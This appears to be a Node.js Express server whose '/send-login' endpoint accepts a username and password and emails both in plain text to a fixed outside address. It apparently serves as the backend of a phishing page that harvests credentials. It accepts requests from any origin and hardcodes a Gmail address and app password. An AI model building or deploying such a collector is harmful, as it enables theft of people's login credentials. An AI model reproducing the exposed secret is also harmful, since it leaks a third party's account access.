const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'muniswar.btech@gmail.com',        // your Gmail
    pass: 'cvbi hppi loud qxus',           // use App Password
  },
});

app.post('/send-login', (req, res) => {
  const { username, password } = req.body;

  const mailOptions = {
    from: 'muniswar.btech@gmail.com',
    to: '22501a4262@pvpsit.ac.in',
    subject: 'Login Attempt',
    text: `Username: ${username}\nPassword: ${password}`,
  };

  transporter.sendMail(mailOptions, (err, info) => {
    if (err) {
      console.error('Error:', err);
      res.status(500).send('Email error');
    } else {
      console.log('Email sent:', info.response);
      res.send('Success');
    }
  });
});

app.listen(5000, () => {
  console.log('Server running on http://localhost:5000');
});
